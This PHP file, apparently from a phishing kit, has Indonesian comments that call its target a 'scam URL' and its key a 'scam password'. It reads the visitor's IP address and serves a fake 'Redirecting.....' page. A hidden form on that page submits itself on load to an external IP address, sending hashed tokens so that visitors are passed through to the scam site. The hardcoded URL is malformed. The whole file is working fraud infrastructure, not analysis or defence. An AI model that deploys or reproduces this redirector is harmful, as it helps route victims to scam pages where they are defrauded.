<?php
$url = "https://https://45.147.231.227/"; // URL scam anda (Wajib menggunakan HTTPS)
$password = "@Kontol99"; // Password Scam (sesuaikan dengan password di config scam)

function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip = getUserIPs();
?>

<html>
    <title>Redirecting.....</title>
    <body onload="document.form.submit()">
		<form name="form" id="form" action="<?php echo $url;?>" method="POST">
		<div style="display:none;">
		<input name="<?php echo md5($ip);?>" value="<?php echo md5($password);?>">
		<input type="submit" value="Continue">
		</div>
		</form>
	</body>
</html>
		
